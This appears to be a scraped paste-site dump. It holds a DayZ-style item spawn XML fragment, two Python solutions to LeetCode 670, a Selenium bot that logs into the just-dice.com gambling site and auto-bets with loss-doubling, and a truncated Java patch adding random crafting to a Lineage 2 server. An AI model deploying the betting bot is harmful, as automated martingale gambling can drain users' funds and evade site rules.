        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""containers""/>
        <usage name=""Town""/>
        <usage name=""Village""/>
        <usage name=""School""/>
    </type>
	<type name=""BAT_SlingBag_Gray"">
        <nominal>50</nominal>
        <lifetime>28800</lifetime>
        <restock>0</restock>
        <min>30</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""containers""/>
        <usage name=""Town""/>
        <usage name=""Village""/>
        <usage name=""School""/>
    </type>
	<type name=""BAT_SlingBag_Green"">
        <nominal>50</nominal>
        <lifetime>28800</lifetime>
        <restock>0</restock>
        <min>30</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""containers""/>
        <usage name=""Town""/>
        <usage name=""Village""/>
        <usage name=""School""/>
    </type>
	<type name=""Bat_MP433"">
        <nominal>5</nominal>
        <lifetime>7200</lifetime>
        <restock>14400</restock>
        <min>0</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""1"" count_in_hoarder=""1"" count_in_map=""1"" count_in_player=""1"" crafted=""0"" deloot=""1""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <value name=""Tier3""/>
        <value name=""Tier4""/>
    </type>
    <type name=""Bat_Grach_mag_18Rnd"">
        <nominal>15</nominal>
        <lifetime>7200</lifetime>
        <restock>1800</restock>
        <min>8</min>
        <quantmin>20</quantmin>
        <quantmax>90</quantmax>
        <cost>0</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
    </type>
	<type name=""Bat_VeprH"">
        <nominal>5</nominal>
        <lifetime>7200</lifetime>
        <restock>14400</restock>
        <min>0</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""1"" count_in_hoarder=""1"" count_in_map=""1"" count_in_player=""1"" crafted=""0"" deloot=""1""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <value name=""Tier3""/>
        <value name=""Tier4""/>
    </type>
    <type name=""Bat_Veprh_mag_5Rnd"">
        <nominal>15</nominal>
        <lifetime>7200</lifetime>
        <restock>1800</restock>
        <min>8</min>
        <quantmin>20</quantmin>
        <quantmax>90</quantmax>
        <cost>0</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
    </type>
	<type name=""Bat_MPL50_Shovel"">
        <nominal>15</nominal>
        <lifetime>7200</lifetime>
        <restock>1800</restock>
        <min>8</min>
        <quantmin>20</quantmin>
        <quantmax>90</quantmax>
        <cost>0</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
    </type>
	<type name=""Bat_GorkaEJacket_Woodland"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>600</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Military""/>
    </type>
    <type name=""Bat_GorkaPants_Woodland"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>600</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Military""/>
    </type>
	 <type name=""Bat_Oakley_White"">
        <nominal>20</nominal>
        <lifetime>2700</lifetime>
        <restock>0</restock>
        <min>10</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""tools""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
        <usage name=""Police""/>
        <usage name=""Town""/>
    </type>
	<type name=""Bat_Oakley_Black"">
        <nominal>20</nominal>
        <lifetime>2700</lifetime>
        <restock>0</restock>
        <min>10</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""tools""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
        <usage name=""Police""/>
        <usage name=""Town""/>
    </type>
    <type name=""Bat_peas"">
        <nominal>100</nominal>
        <lifetime>3600</lifetime>
        <restock>0</restock>
        <min>50</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""food""/>
        <tag name=""shelves""/>
        <usage name=""Town""/>
        <usage name=""Village""/>
        <value name=""Tier1""/>
        <value name=""Tier2""/>
        <value name=""Tier3""/>
    </type>
	<type name=""Bat_M45a1"">
        <nominal>10</nominal>
        <lifetime>10800</lifetime>
        <restock>1800</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <value name=""Tier1""/>
        <value name=""Tier2""/>
    </type>
	<type name=""Bat_Kora_Black"">
        <nominal>10</nominal>
        <lifetime>7200</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
    </type>
	<type name=""Bat_Kora_Camo"">
        <nominal>10</nominal>
        <lifetime>7200</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
    </type>	
	<type name=""Bat_Exfil_H_Black"">
        <nominal>10</nominal>
        <lifetime>7200</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
    </type>	
	<type name=""Bat_Exfil_H_Green"">
        <nominal>10</nominal>
        <lifetime>7200</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
    </type>
    <type name=""Bat_AEK_971"">
        <nominal>5</nominal>
        <lifetime>7200</lifetime>
        <restock>14400</restock>
        <min>0</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""1"" count_in_hoarder=""1"" count_in_map=""1"" count_in_player=""1"" crafted=""0"" deloot=""1""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <value name=""Tier3""/>
        <value name=""Tier4""/>
    </type>	
    <type name=""Bat_ACR"">
        <nominal>5</nominal>
        <lifetime>7200</lifetime>
        <restock>14400</restock>
        <min>0</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""1"" count_in_hoarder=""1"" count_in_map=""1"" count_in_player=""1"" crafted=""0"" deloot=""1""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <value name=""Tier3""/>
        <value name=""Tier4""/>
    </type>	
   <type name=""Bat_HoneyBadger"">
        <nominal>5</nominal>
        <lifetime>7200</lifetime>
        <restock>14400</restock>
        <min>0</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""1"" count_in_hoarder=""1"" count_in_map=""1"" count_in_player=""1"" crafted=""0"" deloot=""1""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <value name=""Tier3""/>
        <value name=""Tier4""/>
    </type>
   <type name=""Bat_ServiceRifle"">
        <nominal>5</nominal>
        <lifetime>7200</lifetime>
        <restock>14400</restock>
        <min>0</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""1"" count_in_hoarder=""1"" count_in_map=""1"" count_in_player=""1"" crafted=""0"" deloot=""1""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <value name=""Tier3""/>
        <value name=""Tier4""/>
    </type>	
    <type name=""Bat_AmmoBox_300BLK_20Rnd"">
        <nominal>10</nominal>
        <lifetime>28800</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
        <value name=""Tier3""/>
    </type>	
    <type name=""Bat_Ammo_8mm"">
        <nominal>45</nominal>
        <lifetime>28800</lifetime>
        <restock>180</restock>
        <min>35</min>
        <quantmin>10</quantmin>
        <quantmax>40</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
    </type>
    <type name=""Bat_Ammo_300BLK"">
        <nominal>45</nominal>
        <lifetime>28800</lifetime>
        <restock>180</restock>
        <min>35</min>
        <quantmin>10</quantmin>
        <quantmax>40</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
    </type>
    <type name=""Bat_Mag_CMAG_30Rnd"">
        <nominal>4</nominal>
        <lifetime>28800</lifetime>
        <restock>0</restock>
        <min>2</min>
        <quantmin>5</quantmin>
        <quantmax>50</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <value name=""Tier3""/>
    </type>	
</types>"
yGpe08NG,670. Maximum Swap,bennyfromtheblock,Python,Tuesday 2nd of January 2024 07:20:45 PM CDT,"# 670. Maximum Swap

# Solution 1:
# A perfectly ordered sequence of digits (no swap needed) will be in non-decreasing order. i.e
# digits[i] >= digits[i+1] for all indices i. If there is a ""kink"" in this sequence (digits[i] < digits[i+1]), then
# we know we need to swap. We want to swap the largest digit on the right side of the kink with the leftmost
# (most significant) digit on the left side of the kink that is less than the right val.

# Time: O(N + N + N) = O(3N) = O(N)
# Space: O(1)

class Solution:
    def maximumSwap(self, num: int) -> int:
        digits = list(str(num))
        n = len(digits)
        i = 0
        while i < n-1 and digits[i] >= digits[i+1]:
            i += 1
        if i == n-1:
            return num

        # find biggest digit after index i
        right_val, right_idx = '0', 0
        for j in range(i+1, n):
            if digits[j] >= right_val:
                right_idx, right_val = j, digits[j]

        # find leftmost digit smaller than right_val
        left_idx = i
        for j in range(i-1, -1, -1):
            if digits[j] < right_val:
                left_idx = j

        digits[left_idx], digits[right_idx] = digits[right_idx], digits[left_idx]

        return int(''.join(digits))
    
    
# Solution 2:
# Going from left to right, we know we want to swap a digit if there is a bigger digit that occurs after this one.
# What if there are multiple occurences of the same swappable digit? We want to use the least significant one,
# i.e. the last occurrence of that digit.
# So, we can use a map to record the last occurence of each unique digit. Then we go left to right, checking for
# bigger digits and if their last occurrence is after the current index.

# Time: O(N + 9*N) = O(N)
# Space: O(N)

class Solution:
    def maximumSwap(self, num: int) -> int:
        digits = list(str(num))
        last_occur = {int(d): i for i, d in enumerate(digits)}

        for i, d in enumerate(digits):
            for n in range(9, int(d), -1):
                if last_occur.get(n, -1) > i:
                    j = last_occur[n]
                    digits[i], digits[j] = digits[j], digits[i]
                    return int(''.join(digits))

        return num
"
Q1JcHJLi,best snowybot for google colab,coinwalk,JavaScript,Tuesday 2nd of January 2024 07:15:52 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import subprocess
import sys

try:
    import selenium
except ImportError:
    subprocess.check_call([sys.executable, ""-m"", ""pip"", ""install"", 'selenium'])
finally:
    import selenium

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options

options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""USERNAME"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""PASSWORD"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
freather = 0.0	
fumble = 0.0001
print(""should see bets"")

def go(): 
    base = 0.0001
    tens = (base*10)
    sevens = (base*6.9)
    eights = (base*7.1)
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((fumble>=tens) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
    time.sleep(0.1)
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(float(fumble))
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
66FvNqJg,Rusacis Random Craft,tensador125,Java,Tuesday 2nd of January 2024 07:12:10 PM CDT,"### Eclipse Workspace Patch 1.0
#P aCis_gameserver
diff --git java/Base/Data/XMLDocument.java java/Base/Data/XMLDocument.java
new file mode 100644
index 0000000..3f06c0f
--- /dev/null
+++ java/Base/Data/XMLDocument.java
@@ -0,0 +1,121 @@
+package Base.Data;
+
+
+
+import java.io.File;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+
+import javax.xml.parsers.DocumentBuilderFactory;
+import javax.xml.transform.OutputKeys;
+import javax.xml.transform.Transformer;
+import javax.xml.transform.TransformerException;
+import javax.xml.transform.TransformerFactory;
+import javax.xml.transform.dom.DOMSource;
+import javax.xml.transform.stream.StreamResult;
+
+import net.sf.l2j.commons.data.StatSet;
+
+import org.w3c.dom.Document;
+import org.w3c.dom.NamedNodeMap;
+import org.w3c.dom.Node;
+
+/**
+ * An XML document, relying on a static and single DocumentBuilderFactory.
+ */
+public abstract class XMLDocument
+{
+   protected static final Logger LOG = Logger.getLogger(XMLDocument.class.getName());
+   
+   protected Document document;
+   
+   private static final DocumentBuilderFactory BUILDER;
+   static
+   {
+       BUILDER = DocumentBuilderFactory.newInstance();
+       BUILDER.setValidating(false);
+       BUILDER.setIgnoringComments(true);
+   }
+   
+   abstract protected void load();
+   
+   abstract protected void parseDocument(Document doc, File f);
+   
+   public void loadDocument(String filePath)
+   {
+       loadDocument(new File(filePath));
+   }
+   
+   public void writeDocument(Document doc, String fileName)
+   {
+       try
+       {
+           TransformerFactory transformerFactory = TransformerFactory.newInstance();
+           Transformer transformer = transformerFactory.newTransformer();
+           transformer.setOutputProperty(OutputKeys.ENCODING, ""UTF-8"");
+           transformer.setOutputProperty(OutputKeys.INDENT, ""yes"");
+           transformer.setOutputProperty(""{http://xml.apache.org/xslt}indent-amount"", ""2"");
+           
+           DOMSource source = new DOMSource(doc);
+           StreamResult result = new StreamResult(new File(fileName));
+           
+           transformer.transform(source, result);
+           LOG.info(""XML file saved to "" + fileName);
+       }
+       catch (TransformerException e)
+       {
+           LOG.warning(""Error saving XML file: "" + e.getMessage());
+       }
+   }
+   
+   /**
+    * Parse an entire directory or file if found.
+    * @param file
+    */
+   public void loadDocument(File file)
+   {
+       if (!file.exists())
+       {
+           LOG.severe(""The following file or directory doesn't exist: "" + file.getName());
+           return;
+       }
+       
+       if (file.isDirectory())
+       {
+           for (File f : file.listFiles())
+           {
+               loadDocument(f);
+           }
+       }
+       else if (file.isFile())
+       {
+           try
+           {
+               parseDocument(BUILDER.newDocumentBuilder().parse(file), file);
+           }
+           catch (Exception e)
+           {
+               LOG.log(Level.SEVERE, ""Error loading XML file "" + file.getName(), e);
+           }
+       }
+   }
+   
+   public Document getDocument()
+   {
+       return document;
+   }
+   
+   /**
+    * This method parses the content of a NamedNodeMap and feed the given StatsSet.
+    * @param attrs : The NamedNodeMap to parse.
+    * @param set : The StatsSet to feed.
+    */
+   public static void parseAndFeed(NamedNodeMap attrs, StatSet set)
+   {
+       for (int i = 0; i < attrs.getLength(); i++)
+       {
+           final Node attr = attrs.item(i);
+           set.set(attr.getNodeName(), attr.getNodeValue());
+       }
+   }
+}
diff --git data/xml/RandomCraft.xml data/xml/RandomCraft.xml
new file mode 100644
index 0000000..7e7a013
--- /dev/null
+++ data/xml/RandomCraft.xml
@@ -0,0 +1,9 @@
+<?xml version=""1.0"" encoding=""UTF-8""?>
+<rewards>
+ <item id=""8762"" count=""1"" chance=""20"" announce=""false""/>
+ <item id=""8790"" count=""1"" chance=""40"" announce=""true""/>
+ <item id=""8793"" count=""1"" chance=""40"" announce=""true""/>
+ <item id=""8794"" count=""1"" chance=""40"" announce=""true""/>
+
+
+</rewards>
\ No newline at end of file
diff --git config/players.properties config/players.properties
index 745d341..944d438 100644
--- config/players.properties
+++ config/players.properties
@@ -235,4 +235,12 @@
 # ExpertisePenalty, чтобы отключить штраф за уровень
 # False : Игроки могут использовать экипировку S ранга с 1 уровня.
 # True : Игроки не могут использовать экипировку S ранга с 1 уровня.
-ExpertisePenalty = True
\ No newline at end of file
+ExpertisePenalty = True
+
+
+
+RandomCraftItemIdRefresh = 3470
+RandomCraftItemIdCreate = 6392
+RandomCraftConsumeRefresh = 10
+RandromCraftConsumeCreate = 50
+MaxItemGeneratorForRandomCraft = 5
diff --git sql/randomcraftitem.sql sql/randomcraftitem.sql
new file mode 100644
index 0000000..e5be5fd
--- /dev/null
+++ sql/randomcraftitem.sql
@@ -0,0 +1,29 @@
+/*
+Navicat MySQL Data Transfer
+
+Source Server         : localhost
+Source Server Version : 50740
+Source Host           : localhost:3306
+Source Database       : 1faris
+
+Target Server Type    : MYSQL
+Target Server Version : 50740
+File Encoding         : 65001
+
+Date: 2024-01-02 21:52:28
+*/
+
+SET FOREIGN_KEY_CHECKS=0;
+
+-- ----------------------------
+-- Table structure for randomcraftitem
+-- ----------------------------
+DROP TABLE IF EXISTS `randomcraftitem`;
+CREATE TABLE `randomcraftitem` (
+  `object_id` int(11) NOT NULL,
+  `item_id` int(11) NOT NULL,
+  `amount` int(11) NOT NULL,
+  `chance` double NOT NULL,
+  `announce` tinyint(1) NOT NULL DEFAULT '0',
+  PRIMARY KEY (`object_id`,`item_id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
diff --git java/Base/RandomCraft/RandomCraftItem.java java/Base/RandomCraft/RandomCraftItem.java
new file mode 100644
index 0000000..c69f3c0
--- /dev/null
+++ java/Base/RandomCraft/RandomCraftItem.java
@@ -0,0 +1,52 @@
+package Base.RandomCraft;
+
+
+import net.sf.l2j.gameserver.data.xml.ItemData;
+import net.sf.l2j.gameserver.model.item.kind.Item;
+
+public class RandomCraftItem {
+    private int id;
+    private int cantidad;
+    private double probabilidad;
+    private boolean announce;
+    private String itemName; // New field for item name
+
+    public RandomCraftItem(int id, int cantidad, double probabilidad, boolean announce) {
+        this.id = id;
+        this.cantidad = cantidad;
+        this.probabilidad = probabilidad;
+        this.announce = announce;
+    }
+
+    public int getId() {
+        return id;
+    }
+
+    public int getCantidad() {
+        return cantidad;
+    }
+
+    public double getProbabilidad() {
+        return probabilidad;
+    }
+
+    public boolean getAnnounce() {
+        return announce;
+    }
+
+    public String getIcon() {
+        return getItem().getIcon();
+    }
+
+    public Item getItem() {
+        return ItemData.getInstance().getTemplate(id);
+    }
+
+    public void setItemName(String itemName) { // Setter for item name
+        this.itemName = itemName;
+    }
+
+    public String getItemName() { // Getter for item name
+        return itemName;
+    }
+}
diff --git java/Base/RandomCraft/RandomCraftXML.java java/Base/RandomCraft/RandomCraftXML.java
new file mode 100644
index 0000000..4448cb3
--- /dev/null
+++ java/Base/RandomCraft/RandomCraftXML.java
@@ -0,0 +1,77 @@
+package Base.RandomCraft;
+
+import java.io.File;
+import java.util.HashMap;
+import java.util.Map;
+
+import org.w3c.dom.Document;
+import org.w3c.dom.NamedNodeMap;
+import org.w3c.dom.Node;
+import Base.Data.XMLDocument;
+
+public class RandomCraftXML extends XMLDocument {
+    private Map<Integer, RandomCraftItem> items;
+
+    public RandomCraftXML() {
+        items = new HashMap<>();
+        load();
+
+    }
+
+    public void reload() {
+        items.clear();
+        load();
+    }
+
+    public static RandomCraftXML getInstance() {
+        return SingletonHolder.INSTANCE;
+    }
+
+    private static class SingletonHolder {
+        protected static final RandomCraftXML INSTANCE = new RandomCraftXML();
+    }
+
+    @Override
+    protected void load() {
+        loadDocument(""./data/xml/RandomCraft.xml"");
+        LOG.info(""RandomCraftItemData: Loaded "" + items.size() + "" items."");
+  
+    }
+
+
+
+
+    @Override
+    protected void parseDocument(Document doc, File file) {
+        try {
+            final Node root = doc.getFirstChild();
+
+            for (Node node = root.getFirstChild(); node != null; node = node.getNextSibling()) {
+                if (!""item"".equalsIgnoreCase(node.getNodeName())) {
+                    continue;
+                }
+
+                NamedNodeMap attrs = node.getAttributes();
+                int id = Integer.parseInt(attrs.getNamedItem(""id"").getNodeValue());
+                int cantidad = Integer.parseInt(attrs.getNamedItem(""count"").getNodeValue());
+                double probabilidad = Double.parseDouble(attrs.getNamedItem(""chance"").getNodeValue());
+                boolean announce = Boolean.parseBoolean(attrs.getNamedItem(""announce"").getNodeValue());
+
+                RandomCraftItem item = new RandomCraftItem(id, cantidad, probabilidad, announce);
+                items.put(id, item);
+
+
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public Map<Integer, RandomCraftItem> getItems() {
+        return items;
+    }
+
+    public RandomCraftItem getItemById(int id) {
+        return items.get(id);
+    }
+}
diff --git java/net/sf/l2j/Config.java java/net/sf/l2j/Config.java
index 2e168ac..e9fef43 100644
--- java/net/sf/l2j/Config.java
+++ java/net/sf/l2j/Config.java
@@ -57,6 +57,18 @@
 	public static final String SERVER_FILE = ""./config/server.properties"";
 	public static final String SIEGE_FILE = ""./config/siege.properties"";
 	
+	
+	
+	public static int RANDOM_CRAFT_ITEM_ID_CONSUME;
+	public static int RANDOM_CRAFT_ITEM_CONSUME_REFRESH;
+	public static int RANDOM_CRAFT_ITEM_ID_CREATE;
+	public static int RANDOM_CRAFT_ITEM_CONSUME_CREATE;
+	public static int RANDOM_CRAFT_ITEM_GENERATOR;
+	
+	
+	
+	
+	
 	// --------------------------------------------------
 	// Clans settings
 	// --------------------------------------------------
@@ -1957,6 +1969,14 @@
 	{
 		final ExProperties players = initProperties(PLAYERS_FILE);
 		
+		
+		RANDOM_CRAFT_ITEM_ID_CONSUME = players.getProperty(""RandomCraftItemIdRefresh"", 57);
+		
+		RANDOM_CRAFT_ITEM_CONSUME_REFRESH = players.getProperty(""RandomCraftConsumeRefresh"", 50000);
+		RANDOM_CRAFT_ITEM_ID_CREATE = players.getProperty(""RandomCraftItemIdCreate"", 3470);
+		RANDOM_CRAFT_ITEM_CONSUME_CREATE = players.getProperty(""RandromCraftConsumeCreate"", 300000);
+		RANDOM_CRAFT_ITEM_GENERATOR = players.getProperty(""MaxItemGeneratorForRandomCraft"", 5);
+		
 		EFFECT_CANCELING = players.getProperty(""CancelLesserEffect"", true);
 		HP_REGEN_MULTIPLIER = players.getProperty(""HpRegenMultiplier"", 1.);
 		MP_REGEN_MULTIPLIER = players.getProperty(""MpRegenMultiplier"", 1.);
diff --git java/net/sf/l2j/gameserver/GameServer.java java/net/sf/l2j/gameserver/GameServer.java
index 2c0ee64..760aa4b 100644
--- java/net/sf/l2j/gameserver/GameServer.java
+++ java/net/sf/l2j/gameserver/GameServer.java
@@ -116,6 +116,7 @@
 import net.sf.l2j.util.IPv4Filter;
 
 import Base.DropMaster.DropMaster;
+import Base.RandomCraft.RandomCraftXML;
 import Base.TeleportInterface.TeleportLocationData;
 
 public class GameServer
@@ -323,7 +324,8 @@
 		StringUtil.printSection(""Gk Interface"");
 		TeleportLocationData.getInstance();
 		
-		
+		StringUtil.printSection(""RandomCraft"");
+		RandomCraftXML.getInstance();
 		
 		
 		StringUtil.printSection(""System"");
diff --git java/net/sf/l2j/gameserver/handler/admincommandhandlers/AdminReload.java java/net/sf/l2j/gameserver/handler/admincommandhandlers/AdminReload.java
index 5b7cc45..60e0619 100644
--- java/net/sf/l2j/gameserver/handler/admincommandhandlers/AdminReload.java
+++ java/net/sf/l2j/gameserver/handler/admincommandhandlers/AdminReload.java
@@ -28,6 +28,7 @@
 import net.sf.l2j.gameserver.model.World;
 import net.sf.l2j.gameserver.model.actor.Player;
 
+import Base.RandomCraft.RandomCraftXML;
 import Base.TeleportInterface.TeleportLocationData;
 
 public class AdminReload implements IAdminCommandHandler
@@ -108,7 +109,11 @@
 					TeleportLocationData.getInstance().reload();
 					player.sendMessage(""Teleport Reloads."");
 				}
-				
+				else if (type.equals(""randomcraft"")) 
+				{
+				RandomCraftXML.getInstance().reload();
+				player.sendMessage(""RandomCraft Reload."");
+			}
 				else if (type.equals(""npc""))
 				{
 					NpcData.getInstance().reload();
@@ -182,7 +187,7 @@
 		player.sendMessage(""Usage : //reload <admin|announcement|buylist|config>"");
 		player.sendMessage(""Usage : //reload <crest|cw|door|htm|item|multisell|npc>"");
 		player.sendMessage(""Usage : //reload <npcwalker|script|skill|teleport|zone>"");
-		player.sendMessage(""Usage : //reload <spawnlist|sysstring|teleto|capsule>"");
+		player.sendMessage(""Usage : //reload <spawnlist|sysstring|randomcraft|teleto|capsule>"");
 	}
 	
 	@Override
diff --git java/net/sf/l2j/gameserver/model/actor/Player.java java/net/sf/l2j/gameserver/model/actor/Player.java
index ddfcb84..1c756b4 100644
--- java/net/sf/l2j/gameserver/model/actor/Player.java
+++ java/net/sf/l2j/gameserver/model/actor/Player.java
@@ -243,6 +243,7 @@
 import net.sf.l2j.gameserver.taskmanager.WaterTaskManager;
 
 import Base.AutoFarm.AutofarmPlayerRoutine;
+import Base.RandomCraft.RandomCraftItem;
 
 /**
  * This class represents a player in the world.<br>
@@ -7970,4 +7971,21 @@
         }
     }
 
+	private List<RandomCraftItem> generatedCraftItems;
+	
+	public List<RandomCraftItem> getGeneratedCraftItems()
+	{
+		return generatedCraftItems;
+	}
+	
+	public void setGeneratedCraftItems(List<RandomCraftItem> items)
+	{
+		generatedCraftItems = items;
+	}
+	
+	public void clearGeneratedCraftItems()
+	{
+		generatedCraftItems.clear();
+	}
+
 }
\ No newline at end of file
diff --git java/net/sf/l2j/gameserver/model/actor/instance/RandomCraft.java java/net/sf/l2j/gameserver/model/actor/instance/RandomCraft.java
new file mode 100644
index 0000000..edd3dc4
--- /dev/null
+++ java/net/sf/l2j/gameserver/model/actor/instance/RandomCraft.java
@@ -0,0 +1,511 @@
+package net.sf.l2j.gameserver.model.actor.instance;
+
+
+
+import java.sql.Connection;
+import java.sql.PreparedStatement;
+import java.sql.ResultSet;
+import java.sql.SQLException;
+import java.util.ArrayList;
+import java.util.LinkedList;
+import java.util.List;
+import java.util.Map;
+import java.util.Random;
+
+import net.sf.l2j.commons.pool.ConnectionPool;
+
+import net.sf.l2j.Config;
+import net.sf.l2j.gameserver.data.xml.ItemData;
+import net.sf.l2j.gameserver.model.World;
